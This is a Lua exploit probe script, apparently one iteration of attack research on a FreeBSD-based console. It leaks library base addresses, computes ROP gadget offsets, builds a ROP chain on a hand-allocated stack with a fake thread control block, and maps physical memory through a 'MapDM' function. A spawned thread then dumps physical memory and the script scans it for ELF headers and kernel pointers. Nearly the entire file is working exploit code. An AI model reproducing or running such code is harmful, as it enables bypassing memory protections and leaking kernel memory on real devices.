-- CRASH_CLASS: MODERATE
-- PROBE 562s: Build chain BEFORE MapDM, map AFTER
--
-- 562r/562n: chain construction (wq to mmap stack) AFTER MapDM → trace blocks
--            → process dies at spawn → main thread never polls
-- 562m: somehow avoided construction traces → child fully executed
--
-- HYPOTHESIS: chain construction before MapDM produces ZERO trace blocks.
-- MapDM itself produces zero trace/death (confirmed 562p/562q).
-- If chain is already built when MapDM happens, spawn should work
-- like 562m: child executes, main thread survives to poll.
--
-- PLAN:
-- 1. Allocate mmap stack + build chain (NO trace — MapDM not yet done)
-- 2. MapDM phys → VA (no trace)
-- 3. Spawn child (child executes chain with MapDM reads)
-- 4. Main thread: poll sentinel on heap
-- 5. Main thread: print results via Lua print + fn_addr write

print("=== PROBE 562s: CHAIN BEFORE MAPDM ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local Z = uint64(0)
local sc477 = mk(477)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local llo = rd(N(ib) + 0x108) or 0; local lhi = rd(N(ib) + 0x10C) or 0
if llo < 0 then llo = llo + 0x100000000 end
if lhi < 0 then lhi = lhi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lhi, llo))
local mapdm_fn = lk + uint64(0x15020)

print(string.format("eb=0x%X%08X lk=0x%X%08X", ehi, elo, lhi, llo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67
local g_mov_rax_m = eb + 0x1A5CC4

-- ============================================================
-- [A] Shared buffer on HEAP
-- ============================================================
local shared = memory.alloc(0x80)
local sh = N(shared)
for i = 0, 0x7C, 4 do wd(sh + i, 0) end

-- ============================================================
-- [B] Build chain BEFORE MapDM (no trace expected)
-- ============================================================
print("[B] building chain BEFORE MapDM")
io.flush()

local mapped_va = uint64("0x880000000")

local ss = 0x4000
local ok_stk, sb_raw = pcall(function()
    return sc477(Z, uint64(ss), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local sb = N(sb_raw)
local rsp = sb + ss - ((sb + ss) % 16) - 8

-- Fake TCB
local tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb) + i, 0) end
wq(N(tcb), uint64(N(tcb)))
local fsb = memory.alloc(8)
wq(N(fsb), uint64(N(tcb)))

local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

-- sysarch(SET_FSBASE=129)
emit(g_pop_rdi); emit(uint64(129))
emit(g_pop_rsi); emit(uint64(N(fsb)))
emit(g_pop_rax); emit(uint64(165))
emit(stub)

-- read 4 qwords from mapped_va → shared+0x10..0x28
for qi = 0, 3 do
    emit(g_pop_rsi); emit(mapped_va + uint64(qi * 8))
    emit(g_mov_rax_m)
    emit(g_pop_rdi); emit(uint64(sh + 0x10 + qi * 8))
    emit(g_mov_m_rax)
end

-- sentinel: 0xDEADFACECAFEBABE → shared+0x00
emit(g_pop_rax); emit(uint64("0xDEADFACECAFEBABE"))
emit(g_pop_rdi); emit(uint64(sh))
emit(g_mov_m_rax)

-- thr_exit(0)
emit(g_pop_rdi); emit(Z)
emit(g_pop_rax); emit(uint64(431))
emit(stub)

local nent = off / 8
print(string.format("  %d entries (%d bytes)", nent, off))

-- thr_param
local pa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
wq(N(pa), g_bare_ret)
wq(N(pa) + 0x10, uint64(sb))
wq(N(pa) + 0x18, uint64(ss))
local tid_buf = memory.alloc(8); wq(N(tid_buf), Z)
wq(N(pa) + 0x30, tid_buf)

io.flush()

-- ============================================================
-- [C] NOW do MapDM (no trace expected from MapDM itself)
-- ============================================================
print("[C] MapDM phys 0x100000000")
pcall(function()
    sc477(mapped_va, uint64(0x4000), uint64(3),
        uint64(0x1012), uint64(0xFFFFFFFF), Z)
end)
local ok_md, rv_md = pcall(function()
    return native.fcall_with_rax(mapdm_fn, 0,
        mapped_va, uint64(0x4000), uint64(3), Z,
        uint64("0x100000000"), uint64(0x4000))
end)
print("rv=" .. (ok_md and N(rv_md) or -999))
io.flush()

-- ============================================================
-- [D] Spawn child + poll sentinel
-- ============================================================
print("[D] spawn + poll")
io.flush()

pcall(function() mk(455)(pa, uint64(0x38)) end)

-- Tight poll: check sentinel on heap
local found = false
local found_iter = 0
for i = 1, 2000000 do
    local sv = rb(sh)
    if sv and sv == 0xDEADFACE then
        found = true
        found_iter = i
        break
    end
end

-- ============================================================
-- [E] Output results
-- ============================================================
io.flush()
print("")

if found then
    print("SENTINEL_FOUND iter=" .. found_iter)
    for qi = 0, 3 do
        local lo = rb(sh + 0x10 + qi * 8) or 0
        local hi = rb(sh + 0x14 + qi * 8) or 0
        local tag = ""
        if lo == 0x464C457F then tag = " *** ELF! ***" end
        if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then tag = tag .. " KPTR?" end
        print(string.format("phys+0x%02X = 0x%08X_%08X%s", qi*8, hi, lo, tag))
    end
else
    print("SENTINEL NOT FOUND")
    local sv = rb(sh) or 0
    print(string.format("sentinel_raw=0x%08X", sv))
    -- Read data anyway in case reads completed but sentinel write failed
    for qi = 0, 3 do
        local lo = rb(sh + 0x10 + qi * 8) or 0
        local hi = rb(sh + 0x14 + qi * 8) or 0
        print(string.format("phys+0x%02X = 0x%08X_%08X (unconfirmed)", qi*8, hi, lo))
    end
end

io.flush()

-- Also try fn_addr write to send raw shared buffer
print("")
print("RAW_SHARED_START")
io.flush()
pcall(function()
    native.fcall_with_rax(stub, 4, uint64(1), shared, uint64(64))
end)
io.flush()
print("")
print("RAW_SHARED_END")

local pid2 = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid2 .. (pid2 == pid_val and " ALIVE" or " DEAD"))
print("=== 562s DONE ===")
